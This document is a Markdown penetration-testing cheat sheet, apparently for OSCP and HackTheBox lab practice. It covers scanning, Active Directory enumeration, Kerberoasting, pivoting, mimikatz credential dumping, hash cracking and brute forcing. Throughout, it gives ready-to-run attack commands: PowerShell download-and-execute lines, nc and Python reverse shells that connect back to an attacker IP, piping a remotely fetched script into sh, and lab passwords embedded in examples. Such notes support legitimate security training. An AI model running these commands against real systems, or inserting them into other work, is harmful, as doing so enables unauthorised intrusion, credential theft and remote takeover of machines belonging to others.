## Ultimate Guide
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) <br/>
[Hacktricks](https://book.hacktricks.xyz/) <br/>
[GTFOBins](https://gtfobins.github.io/) <br/>
[WADComs](https://wadcoms.github.io/) <br/>

## Easy win
nmap scan <br/>
hydra ssh/ftp/rdp etc protocols<br/>
burp/wireshark<br/>
service report(enum4linux, Nikto, snmpwalk, dirbuster, onesixtyone, gobuster, vhost)<br/>
msf modules<br/>
log in anonymous (ftp, smb guess session)<br/>
PUT or POST files to ports<br/>
PHP < 5.3<br/>
SQL running<br/>
SQL injection (JSON?not json? blind sql?)<br/>
Weak login? Bypass?<br/>
LFI/RFI?<br/>
Cookies? (bypass login? rce?)<br/>
Create wordlists for brute force (cewl)<br/>
Searchsploit?<br/>

## Port Scanning
Options:<br/>
-sT connect scan<br/>
-sU UDP scan<br/>
-sS TCP SYN scan<br/>
-sn network sweep<br/>
-sC default script<br/>
-sV version detection of services<br/>
-A Enable OS detection, version detection, script scanning, and traceroute<br/>
-O OS Fingerprint<br/>
-p- scans all TCP ports<br/>
-Pn SOMETIMES causes FALSE POSITIVE, skip the initial stage that checks if the host is up<br/>
-oG saves the output and uses grep to filter the results to only show lines that contain the word "open" in the "Ports" field 

## Banner Grabbing
```bash
nc -vn <IP> Port
```
- [Port 21 - FTP](https://www.noobsec.net/oscp-cheatsheet/#port-21---ftp)<br/>
- [Port 22 - SSH](https://www.noobsec.net/oscp-cheatsheet/#port-22---ssh)<br/>
- Port 23 - Telnet<br/>
	- transfer data in plain text<br/>
- [Port 53 - DNS](https://www.noobsec.net/oscp-cheatsheet/#port-53---dns)<br/>
- [Port 79 - Finger](https://www.noobsec.net/oscp-cheatsheet/#port-79---finger)<br/>
- [Port 80/443 - HTTP(S)](https://www.noobsec.net/oscp-cheatsheet/#port-80443---https)<br/>
- [Port 110 - POP3](https://www.noobsec.net/oscp-cheatsheet/#port-110---pop3)<br/>
	- **SMTP sends the email from the sender's device to the receiver's mailbox, and POP3 retrieves and organizes emails from the receiver's mail server to the receiver's computer**<br/>
- [Port 139/445 - SMB](https://www.noobsec.net/oscp-cheatsheet/#port-139445---smb)<br/>
- [Port 161 - SNMP](https://www.noobsec.net/oscp-cheatsheet/#port-161---snmp)<br/>
	- used for **communication between routers, switches, firewalls, load balancers, servers, CCTV cameras, and wireless devices**.<br/>
- [Port 2049 - NFS](https://www.noobsec.net/oscp-cheatsheet/#port-2049---nfs)<br/>
	- allows remote hosts to mount file systems over a network and interact with those file systems as though they are mounted locally<br/>
- Port 135, 593 - MSRPC<br/>
- Port 25, 465(SSL), 587(SSL) - SMTP<br/>
	- protocol utilized within the TCP/IP suite for the **sending and receiving of e-mail**<br/>
- Port 389,636,3269 - LDAP<br/>
	- LDAP is a protocol that many different directory services and access management solutions can understand.<br/>
- Port 5432, 5433 - Postgresql<br/>
- Port 1433 - MSSQL <br/>
- Port 3306 - MYSQL<br/>
- Port 6379 - Redis<br/>
	- a fast, open-source, in-memory key-value data structure store.<br/>
	- session cache<br/>
	- (FPC) Full Page Cache<br/>
- Port 3389 - RDP<br/>
	- graphical interface connection between computers over a network.<br/>
- Port 2049 - NFS service <br/>
	- **NFS** is a system designed for **client/server** that enables users to seamlessly access files over a network as though these files were located within a local directory.<br/>


## Initial Scan
nmap -sC -sV -oA nmap/initial (ip address) <br/>
(default script)(version detection of services)(output to nmap initial) 
## Detail Scan
nmap --script all -sC -sV -O -o fulltcpnmap -A -T4 -p- 10.129.77.60 (detail) <br/>
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.3(detail) <br/>
enum4linux <br/>
nmap -A -sV -sU -sC -p- -o fulludpnmap 10.10.10.xxx <br/>
udp scan 
## SMB Quick Check
```
nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.129.77.60
```
## Host Discovery
nmap -sn 10.10.1.1-254 -vv -oA hosts 
netdiscover -r 10.10.10.0/24
```bash
#!/bin/bash  
  
for i in {1..256}; do ping -c 1 10.200.57.$i | grep "bytes from" | cut -d':' -f 1 | cut -d' ' -f4 & done && wait
```
## Multi-threaded Python Port Scanner
https://github.com/dievus/threader3000
## DNS server/vhost discovery
```
nmap -p 53 10.10.10.1-254 -vv -oA dc 
```
## Gobuster, FFUF and dnsrecon
```
gobuster dns -d cronos.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 
gobuster vhost -u http://stocker.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain 
//gobuster vhost 
wfuzz -u http://10.10.11.114 -H "Host: FUZZ.bolt.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 30341 
//you can do it using wfuzz 
```
FFUF can be used to discovery subdomains by the use of virtual hosts and changing the Host header <br/>
Try running the below ffuf: <br/>
```
ffuf -w ~/wordlists/subdomains.txt -H "Host: FUZZ.ffuf.me" -u http://ffuf.me
```
You'll see from the results that every result comes back with a size of 1495 Bytes.<br/>
Now try running the below ffuf scan but this time using the -fs switch to filter out any results that are 1495 bytes.<br/>
```
ffuf -w ~/wordlists/subdomains.txt -H "Host: FUZZ.ffuf.me" -u http://ffuf.me -fs 1495
```
dnsrecon:<br/>
```
dnsrecon -r 192.168.13.200-192.168.13.254 -n 192.168.13.220   //reverse lookup. dns server is -n
dnsrecon -d acme.local -D /usr/share/golismero/wordlist/dns/dnsrecon.txt -t brt  //bruteforce the acme.local domain for domains and subdomains
dnsrecon -a -d thinc.local -n 192.168.13.220  ## trying zone transfer. -n is the DNS server
dnsenum (for better view and auto everything)
```
<br/>
Dig Deeper:<br/>
```
dig axfr cronos.htb @10.10.10.13
```
retrieve the entire DNS zone data for the "cronos.htb" domain from the DNS server located at the IP address "10.10.10.13".<br/>
(AXFR) DNS protocol operation used to transfer the entire zone data from a primary DNS server to a secondary DNS server.

## Active Directory Check
```bash
#dig
dig @10.10.10.52 AXFR htb.local 
dnsenum 10.10.10.52
```
### Check smb/rpc
```bash
#smb/rpc
smbclient -L 10.10.10.52 -N 
rpcclient 10.10.10.52 -N
smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>
smbclient -N -L //192.168.143.225
smbclient //10.129.143.225/shares -c 'ls' -U ""%""
smbclient '\\10.129.143.225\shares' -U 'guest'%'' -c 'prompt OFF;recurse ON;lcd /home/jacky/hacking/10.129.143.225/smbloot/;mget *'

Maybe mount files for better view
mount -t cifs //10.10.10.192/profiles$ /mnt
```
### Check nmap scripts
```bash
#nmap scripts
nmap -p 139,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.129.77.60

#Check eternal blue (less possible)

#enumerate krb users
nmap 192.168.x.x -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='oscp.exam',userdb=/usr/share/seclists/Usernames/Names/names.txt
```
### Check ldapsearch
```bash
#ldapsearch
ldapsearch -x -H ldap://10.10.10.52 -b "dc=htb,dc=local"
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=cascade,DC=local" > full_ldap_dump.txt
ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people
ldapsearch -x -H ldap://$IP -s base | grep -i sAMAccountName:
ldapsearch -x -H ldap://$IP -s base | grep -i namingcontexts
ldapsearch -x -H ldap://$IP -s base | grep -i description
ldapsearch -H ldap://$IP -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' | grep lockout

Search sth new and back to dig
```
### Check ldap with nmap and enum4linux
```bash
nmap -p 389 --script ldap-search 10.10.10.161
enum4linux 10.10.10.161 > enum4linux-results.txt
```

Retrieve domain users who do not have "Do not require Kerberos preauthentication" set and ask for their TGTs without knowing their passwords. <br/>
Obtain a password hash for user accounts that have an SPN (service principal name) as well:<br/>
```bash
#GetNPUsers.py
GetNPUsers.py htb.local/ -dc-ip 10.10.10.52
impacket-GetNPUsers 'cascade.local/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip $IP

#GetUserSPNs.py
impacket-GetUserSPNs -request -dc-ip 127.0.0.1 'sizzle.htb.local/amanda:Ashare1972' -save -outputfile GetUserSPNs.out

proxychains GetUserSPNs.py –request –dc-ip xx.x.x.xx
oscp.exam/xxxx –outputfile /tmp/hashes.kerberoast

imapacket-mssqlclient oscp.exam/xxx:xxxx@192.168.x.x –windows-auth
--> xp_cmdshell

john –format=krb5tgs –wordlist=~/rockyou.txt /tmp/hashes.kerberoast
```

### Kerbrute/CME/RCE/Check other common exploits
```bash
powershell -c iex( iwr http://10.10.14.9/shell.ps1 -UseBasicParsing )
IEX (New-Object System.Net.Webclient).DownloadString("http://MYIP/powercat.ps1");powercat -c MYIP -p 4444 -e powershell

#kerbrute
kerbrute -domain htb.local -users /usr/share/wordlists/names.txt -dc-ip 10.10.10.52

#crackmapexec
crackmapexec smb 10.10.10.52 -d htb.local -u htb.local/james -p /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt

goldenpac, zerologon, printnightmare, printspoofer, noPAC, Password Hash Synchronization, PrivExchange attack, Password Hash Synchronization (Microsoft Azure AD Sync)**
```

## Chisel/Pivoting
```powershell
cat /etc/proxychains4.conf

linux
./chisellinuxamd server -p 8080 --reverse &
./chisellinuxamd client 10.10.16.25:8080 R:socks &
ps auxww | grep chisel

windows
$scriptBlock = { Start-Process C:\Windows\Tasks\chisel.exe -ArgumentList @('client','10.0.0.2:8080','R:socks') } 
Start-Job -ScriptBlock $scriptBlock

$process = Get-Process -Name chisel 
Stop-Process -Id $process.Id

#rev shell
$scriptBlock = { Start-Process C:\Windows\Tasks\nc.exe -ArgumentList @('10.0.0.2','4444','-e','cmd.exe') } 
Start-Job -ScriptBlock $scriptBlock
```

## Dump password
```
powershell iwr -uri 10.10.14.14/mimikatz.exe -outfile m.exe
.\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit
.\m.exe "privilege::debug" "token::elevate" "lsadump::lsa /patch" exit
pypykatz lsa minidump lsass.DMP

#one line all
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

## Evil winrm
```
evil-winrm -i 192.x.x.101 -u administrator -H xxxxxxxx
upload local_filename destination_filename
download remote_filename destination_filename
```

## NSE Scripts Scan
```
cat script.db | grep '"vuln"\\|"exploit"'
nmap -sV --script=vulscan/vulscan.nse
```
Port specific NSE script list:
```
ls /usr/share/nmap/scripts/ssh\*
ls /usr/share/nmap/scripts/smb\*

masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 > ports
ports=\$(cat ports | awk -F " " '{print \$4}' | awk -F "/" '{print \$1}' | sort -n | tr '\n' ',' | sed 's/,\$//')
nmap -Pn -sV -sC -p$ports 10.10.10.x
```
Running specific NSE scripts:
```
nmap -Pn -sC -sV --script **"http-*"** -p$ports 10.10.10.x -T4 -A
```
Searchsploit
```
searchsploit \<name\>
searchsploit \<name\> -w -t  | grep http | cut -f 2 -d "|"
searchsploit -x exploits/php/webapps/47691.sh
for e in \$(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|");
do exp_name=\$(echo \$e | cut -d "/" -f 5) && url=$(echo $e | sed 's/exploits/raw/') &&
wget -q --no-check-certificate $url -O $exp_name; done
```

Database/Website search clues:
```
find / -name database_settings.inc.php 2>/dev/null
find config/config.inc.php
cat /etc/apache2/sites-enabled/internal.conf 
```
## Linpeas/pspy64
linpeas: scan linux and exploit
pspy64: check hidden cron jobs 
```
python -m http.server 5050/80
curl \<kali linux ip address\>:5050/80/linpeas.sh | sh
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim
wget http://attackerip/file
curl http://attackerip/file > file
```
## Burp Suite
Proxy, Intercept is On<br/>
Send to intruder for automation<br/>
Send to Repeater<br/>
Make sure post/get?<br/>
-x/--proxy to localhost:8000 for intercept? (default port burp is 8080)<br/>
<br/>
TCPDUMP<br/>
icmp listener<br/>
tcpdump -ni tun0 icmp<br/>
tcpdump -xvi tun0 -c 10
## USB
grab a copy of the USB disk:<br/>
```
sshpass -p raspberry ssh pi@10.10.10.48 "sudo dd if=/dev/sdb | gzip -1 -" | dd of=usb.gz
```
read all of /dev/sdb and print it to STDOUT<br/>
compress the file read from STDIN (-) and print the result to STDOUT,write that output to usb.gz<br/>
extundelete usb --restore-all
## Port Knocking
TCP<br/>
knock -v 192.168.0.116 4 27391 159<br/>
<br/>
UDP<br/>
knock -v 192.168.0.116 4 27391 159 -u<br/>
<br/>
TCP & UDP<br/>
knock -v 192.168.1.111 159:udp 27391:tcp 4:udp
## Brute Force
### Johntheripper and cewl
```
/usr/share/john/ssh2john.py key > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
gpg2john .keys > gpg.john (PGP keys)

cewl -d 2 -m 5 -w docswords.txt http://10.10.10.10
-d depth
-m minimum word length
-w output file
--lowercase lowercase all parsed words (optional)
```

// For removing duplications in wordlist<br/>
```
cat wordlist.txt| sort | uniq > new_word.txt
```
### Hydra brute force
Find mode if you forget: hashcat --help | grep -i "Kerberos"<br/>
Check type: http-post-form? ssh? etc<br/>
hashcat -m 0 'hash$' /home/kali/Desktop/rockyou.txt // MD5 raw<br/>
hashcat -m 1800 'hash\$' /home/kali/Desktop/rockyou.txt // sha512crypt<br/>
hashcat -m 1600 'hash\$' /home/kali/Desktop/rockyou.txt // MD5(APR)<br/>
hashcat -m 1500 'hash\$' /home/kali/Desktop/rockyou.txt // DES(Unix), Traditional DES, DEScrypt<br/>
hashcat -m 500 'hash\$' /home/kali/Desktop/rockyou.txt // MD5crypt, MD5 (Unix)<br/>
hashcat -m 400 'hash\$' /home/kali/Desktop/rockyou.txt // Wordpress<br/>
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule<br/>
--potfile-disable to ignore potfile, if hashcat shows HEX[] strings as result, you may need to use --outfile-autohex-disable <br/>
Some login forms use simple base64<br/>
Try this:
```bash
hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.233.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
```
-l user -P wordlist <br/>
-t 4<br/>
-V verbose<br/>
-s <br/>
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 10.129.18.249 http-post-form "/tiny/tinyfilemanager.php:fm_usr=^USER^&fm_pwd=^PASS^:Invalid Username or Password"
```
Output grepping:
```
grep "password: " validpasswords.txt | awk '{print $7}' >> passwords.txt
```
ffuf login brute force:
```
ffuf -request requests.txt -request-proto http -mode clusterbomb -w passwords.txt:FUZZ -mc 200
```
Brute Force too long? Try this! <br/>
```
cewl http://dc-2 -m 5 -w cewl.txt 2>/dev/null
username-anarchy --input-file users.txt --select-format first,flast,first.last,firstl > unames.txt
```
## Online tools
https://crackstation.net/ <br/>
LM, NTLM, md2, md4, md5, md5(md5_hex), md5-half, sha1, sha224, sha256, sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1_bin)), QubesV3.1BackupDefaults<br/>
https://www.dcode.fr/tools-list <br/>
MD4, MD5, RC4 Cipher, RSA Cipher, SHA-1, SHA-256, SHA-512, XOR Cipher<br/>
https://www.md5online.org/md5-decrypt.html (MD5)<br/>
https://products.aspose.app/email/viewer/msg (MSG reader)<br/>
https://www.encryptomatic.com/viewer/ (view attachments .eml, .msg, winmail.dat)<br/>
https://github.com/williballenthin/python-evtx (view windows logs .evtx)<br/>
https://github.com/icsharpcode/ILSpy (open-source .NET assembly browser and decompiler)<br/>
https://gchq.github.io/CyberChef/ (Swiss Knife)<br/>
https://tio.run/# (debug)<br/>
Full interactive shell with zsh<br/>
https://blog.mrtnrdl.de/infosec/2019/05/23/obtain-a-full-interactive-shell-with-zsh.html

## Upgrade shell
```
ctrl + z
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
stty raw -echo; fg
stty rows ROWS cols COLS
export TERM=xterm-256color
/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
```
<br/>
Can use script to upgrade shell<br/>

```
SHELL=/bin/bash script -q /dev/null
```
<br/>
Python upgrade shell<br/>

```
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
```

<br/>
```
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Kali-IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
## Flags
Windows:<br/>
```powershell
hostname && whoami.exe
cd C:\Users\Administrator
type "C:\Users\Administrator\Desktop\proof.txt"
ipconfig

#search flags
dir /s proof.txt
```

```powershell
Check for alternative data streams:
dir /a /r
powershell -c Get-Content -stream flag.txt root.txt
```
<br/>
Linux:<br/>
```
cd /root
hostname && whoami && cat /root/proof.txt && ip a
```
